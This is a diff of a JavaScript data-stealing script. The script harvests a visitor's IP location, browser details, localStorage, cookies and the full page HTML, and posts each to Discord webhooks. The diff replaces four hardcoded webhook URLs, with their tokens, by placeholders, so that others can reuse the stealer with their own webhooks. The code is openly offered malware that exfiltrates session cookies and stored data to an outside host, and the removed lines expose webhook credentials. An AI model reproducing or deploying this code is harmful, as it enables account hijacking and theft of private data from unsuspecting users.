@@ -1,3 +1,4 @@
+//ADD UR OWN FUCKING WEBHOOKS
 function delay(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
@@ -110,21 +111,21 @@ fetch('https://ipapi.co/json/')
       **Clipboard Access:** ${navigator.clipboard ? "Yes" : "No"}
       **Battery Info:** ${batteryInfo}`;
 
-      const firstWebhookUrl = "https://discord.com/api/webhooks/1342044621584207902/rDjcXDP-pRmR94cydJKM_n43ogg254VRWNtHdFkQ2UTjGhOXQZacKyxUCCwick43NIWk";
+      const firstWebhookUrl = "YOUR WEBHOOK FOR MAIN LOGS";
       sendToDiscord(userInfo, firstWebhookUrl);
 
       let localStorageData = getLocalStorageData();
       let localStorageMessage = `**LocalStorage Data:** ${localStorageData}`;
-      const localStorageWebhook = "https://discord.com/api/webhooks/1342089280528322560/kTSLbRO3V_DAL_4GqbGB8a4Odsnbbf0mV5qp0yD5GPx-kY88qtMRlQotrY2LQkLkMLM_";
+      const localStorageWebhook = "YOUR WEBHOOK FOR LOCALSTORAGE";
       sendToDiscord(localStorageMessage, localStorageWebhook);
 
       let cookiesData = getCookies();
       let cookiesMessage = `**Cookies:** ${cookiesData}`;
-      const cookiesWebhook = "https://discord.com/api/webhooks/1342094215819165707/q9hnQRv8_Dzm5h2ucp0SOh_TNagLIhuNrXLN4JT6Xwi5dgTSHK6ivonookD7GPyIL5x3";
+      const cookiesWebhook = "YOUR WEBHOOK FOR COOKIES";
       sendToDiscord(cookiesMessage, cookiesWebhook);
 
       let htmlData = document.documentElement.outerHTML;
-      const htmlWebhook = "https://discord.com/api/webhooks/1342103786952327280/4JgRIHm9kOU1WNJI1FeH_yE7H86cEfy6DGLH_j78NsL1RoM31pJkd_DgSVYH0-OrYv6z";
+      const htmlWebhook = "YOUR WEBHOOK FOR HTML";
       sendToDiscord(htmlData, htmlWebhook, "page.html");
     });
   })
